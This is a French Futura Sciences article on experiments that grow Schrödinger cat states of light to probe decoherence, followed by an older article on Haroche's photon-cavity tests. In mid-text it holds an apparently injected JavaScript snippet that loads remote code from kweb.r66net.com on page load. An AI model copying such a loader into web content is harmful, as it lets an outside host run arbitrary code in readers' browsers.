{"title": "Des chercheurs font grandir des chats de Schrodinger de lumiere pour etudier la decoherence", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-05-04", "content": "Le celebre paradoxe du chat de Schrodinger peut s'etudier non seulement avec des corps materiels mais aussi avec des paquets de lumiere. Mais quelle est la taille limite au-dela de laquelle ces paquets quantiques deviennent classiques ? C'est a cette question qui n'a pas encore de reponse completement satisfaisante que des physiciens vont essayer de repondre en faisant grandir des chats de Schrodinger de lumiere. Ce qu'il faut retenir Si les lois du monde quantique s'appliquaient aux objets a notre echelle, des chats pourraient parfois etre morts ET vivants. Il n'en est rien et c'est le fameux paradoxe du chat de Schrodinger. Ce paradoxe avec des paquets de lumiere et sa resolution avec la theorie de la decoherence sont etudies. Une technique d'optique quantique est developpee pour produire des chats de plus en plus grands afin d'etudier l'influence de la taille sur cette decoherence. Interview : le paradoxe du chat de Schrodinger                       Le chat de Schrodinger est une experience de pensee souvent evoquee en physique quantique. Ce paradoxe celebre decrit la combinaison lineaire d'etats appliquee a un sujet assez particulier : un chat. Futura-Sciences a rencontre Claude Aslangul, physicien, pour qu'il nous parle plus en detail de cette idee.                                       Dans son celebre cours de  physique ,  Richard Feynman  presentait la  mecanique quantique  en disant de cette theorie qu'elle  << est la description du comportement de la  matiere et de la lumiere  dans tous leurs details et, en particulier, des phenomenes evenements a l'echelle atomique >>.  Et le prix Nobel d'ajouter :  << les choses a tres petite echelle ne se comportent comme rien de ce que vous avez une experience directe. Elles ne se comportent pas comme des ondes, elles ne se comportent pas comme des particules, elles ne se comportent pas comme des  nuages , ni des boules de billard, ni des poids sur des ressorts, ni comme rien de ce que vous avez deja vu >> . Cela pose donc un double probleme. Le premier est bien sur celui de comprendre intuitivement ce  monde quantique  et, au fond, comme le soutenaient Heisenberg et Dirac, la seule solution semble etre dans le repli au sein d'un schema mathematique et une longue pratique avec celui-ci. Le second probleme est d'ordre theorique. La mecanique quantique se presente comme la theorie la plus fondamentale de la realite, mais comment se fait-il alors que la description du monde a notre echelle soit bien differente ? Comment le monde classique emerge-t-il du quantique ?  En 1935,  Erwin Schrodinger , l'un des principaux createurs de la mecanique quantique, pensait avoir fourni un element de reponse  via  sa fameuse experience de pensee depuis appelee en son honneur << le paradoxe du  chat de Schrodinger  >>. La description du monde atomique devait en fait etre fausse et une future mecanique quantique allait probablement retablir la description classique de ce monde au moyen d'une representation plus complete de la realite. Une conference du physicien Jean Michel Raimond sur l'etude du paradoxe du chat de Schrodinger avec de la lumiere en relation avec la theorie de la decoherence. (c) Institut des hautes etudes scientifiques (IHES) Quelle limite de taille pour la transition quantique classique ? On sait qu'il n'en fut rien et comme nous l'expliquions dans l'article ci-dessous, la theorie de la decoherence est venue dissiper le mystere du paradoxe de Schrodinger et elle fonctionne aussi bien avec la  matiere  que la  lumiere . Toutefois, cela ne veut pas dire que tout le monde soit convaincu par cette theorie ni que tous les problemes conceptuels que contient la theorie quantique soient resolus. Les physiciens cherchent toujours a comprendre comment les aspects classiques  emergent  des aspects quantiques et l'une des pistes explorees fait intervenir la taille du systeme physique considere dans les experiences. Les choses ne sont pas claires cependant et beaucoup s'interrogent sur le sens et la definition d'une taille au-dela de laquelle le quantique s'efface devant le classique.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un groupe de chercheurs russes et canadiens, dont certains travaillent a l'Institut canadien de recherches avancees, vient de publier un article dans  Nature Photonics , disponible sur  arXiv , faisant etat d'une nouvelle technique permettant d'explorer l'effet de la taille d'un systeme physique dans une experience de type chat de Schrodinger. Elle s'effectue dans le domaine de l'optique quantique avec des paquets d' ondes electromagnetiques  dont les amplitudes sont grandes, et qui representent d'un point de vue quantique ce que l'on appelle des  etats comprimes . Un dispositif permet d'amplifier a repetition ces ondes en etat de superposition quantique avec donc a chaque fois une amplitude plus importante.  Or  qui dit amplitude plus importante, dit un plus grand nombre de  photons  dans un paquet d'ondes electromagnetiques et qui se rapprochent donc progressivement d'une onde electromagnetique classique comme un corps materiel quantique compose d'un nombre sans cesse plus eleve d' atomes  se rapproche d'un objet materiel classique. Dans le cas present, la superposition quantique d'etat mort et vivant pour un chat de Schrodinger est realisee dans un paquet avec des  champs electriques  qui sont de directions opposees. En reutilisant en entree un paquet produit en sortie par l'experience qui a plus que double l' energie  dans le paquet, on peut, etape par etape, faire << grandir >> le chat de Schrodinger et tenter de determiner a quelle taille un equivalent de la decoherence se produit et qu'un passage du quantique au classique s'effectue. Pour en savoir plus Les oscillations de la fonctions de Wigner disparaissent rapidement dans l'experience realisee. (c) Nature                                Chat de Schrodinger : la decoherence fonctionne aussi avec la lumiere ! Article de  Laurent Sacco  publie le 01/10/2008 Une equipe de chercheurs francais vient de realiser une experience mettant en scene le celebre chat de Schrodinger, non pas avec de la matiere, mais avec de la lumiere. En accord avec la theorie de la decoherence, ils ont pu visualiser les differentes etapes faisant passer le chat d'un etat quantique a l'etat classique. C'est une equipe du laboratoire Kastler Brossel et du College de France qui vient de faire parler d'elle avec des experiences a la frontiere du monde classique et du monde quantique destinees a sonder les fondements de la theorie quantique. Parmi les noms des auteurs d'un article publie par  Nature , on trouve celui de Serge Haroche, professeur au College de France, bien connu pour ses experiences sur la decoherence avec des  atomes de Rydberg . Il s'agissait justement de tester la theorie de la decoherence, centrale pour expliquer le paradoxe du chat de Schrodinger, non plus dans le cas de la matiere mais dans celui de la lumiere. Rappelons brievement en quoi consiste ce paradoxe. Dans le monde quantique, tous les aspects du monde classique sont flous et d'une certaine facon potentiels. On peut juste parler de la probabilite de l'observation d'un objet dans un etat classique et il est interdit de lui attribuer une existence dans le sens ou nous pensons, par exemple, que les planetes possedent une position et une  vitesse  bien determinees et que nous ne doutons pas que l' ordinateur  de notre bureau existe toujours lorsque nous ne somme pas la pour l'observer.  Schrodinger, tout comme  Einstein , ne pouvait pas supporter cette vision du monde impliquee par les  equations  de la mecanique quantique, dont celle portant son nom, l' equation de Schrodinger . Il chercha a montrer que les bizarreries de la mecanique quantique et de son interpretation orthodoxe, celle de Copenhague, ne pouvaient pas etre confinees par un cordon sanitaire dans le monde des atomes et qu'elles devaient se manifester a notre echelle. Ainsi, si l'on considerait un chat enferme dans une boite avec un atome radioactif susceptible de se desintegrer, il fallait, selon la mecanique quantique, considerer l'objet macroscopique, c'est-a-dire le chat, comme faisant un seul objet quantique avec l'atome a cause d'un phenomene appele l' intrication quantique . Or, d'apres les lois de la mecanique quantique, l'atome devait se retrouver dans une superposition d'etats. Il pouvait ainsi, simultanement, se desintegrer ou pas, seul un observateur cherchant a savoir si la desintegration avait bien eu lieu ou non provoquerait le passage de l'etat de l'atome dans une seule de ces deux alternatives. Seulement voila, si un compteur Geiger etait present dans la boite et capable de declencher le  mouvement  d'un marteau brisant un fiole contenant du cyanure en cas de desintegration de l'atome, on aboutissait a une conclusion etonnante : tant qu'un observateur n'ouvrait pas la boite pour observer le chat de l'experience de pensee proposee par Schrodinger, ce dernier etait quantiquement dans une superposition d'etats, a la fois vivant et mort ! L'experience du chat de Schrodinger. Credit :  universe-review                               Pour Schrodinger, le fait qu'une telle situation ne se rencontrait evidement pas dans la vie de tous les jours etait une preuve que l'interpretation orthodoxe de la theorie quantique etait fausse. Cela ne convainquit pas des physiciens comme Bohr et Heisenberg et des annees plus tard, une explication fut trouvee : la theorie de la decoherence. Selon elle, la situation avec un chat et un atome radioactif completement isoles etait une vue de l'esprit et n'existe nulle part dans l' Univers . La superposition des deux etats etait en fait tres fragile et de legeres perturbations en provenance de l'environnement exterieur provoquaient la destruction de la superposition en un temps plus bref que celui mis pour ouvrir le boite par un observateur.  Cette theorie a ete testee il y a quelques annees, notamment par Serge Haroche et ses collegues, mais avec des atomes, la theorie fonctionnait-elle avec des photons intriques en etat de superposition quantique dans une cavite aux parois supraconductrices ? Pour le savoir, les chercheurs ont fait appelle a la mesure de ce qu'on appelle la fonction de Wigner. Le prix Nobel Eugene Wigner. Credit :  The Nobel Foundation 1963                       Introduite dans les annees 1930 par differents physiciens dont le futur prix Nobel de physique hongrois Eugene Wigner, il s'agit d'une puissante generalisation de la fonction d'onde de Schrodinger donnant, par exemple, la probabilite d'observer la position d'un  electron  autour d'un atome. Il existe une seconde fonction d'onde donnant la probabilite d'observer l'electron avec une  quantite de mouvement  donnee et la fonction de Wigner est une sorte de  fusion  de ces deux descriptions en une seule. Appliquee au cas de photons intriques dans la cavite precedente, cette fonction qui depend dans ce cas de deux parametres montre des oscillations avec des valeurs positives et negatives que l'on a representees respectivement en rouge et bleu sur le schema ci-dessous. En faisant passer des atome de Rydberg dans la cavite et en mesurant leur etat a la sortie, il est possible de reconstruire l'etat des photons intriques et surtout cette fonction de Wigner. En quelques dizaines de millisecondes, on constate alors que les oscillations de la fonction de Wigner disparaissent pour ne plus laisser que des valeurs positives, c'est-a-dire precisement ce qu'on attend selon la theorie de la decoherence de la disparition d'un etat d'intrication avec superposition d'un etat mort et d'un etat vivant pour un chat de Schrodinger. Comme on pouvait s'y attendre a cause de la  dualite onde-corpuscule , la theorie de la decoherence fonctionne aussi bien dans le cas de la lumiere que dans celui de la matiere... ", "theme": "sciences"}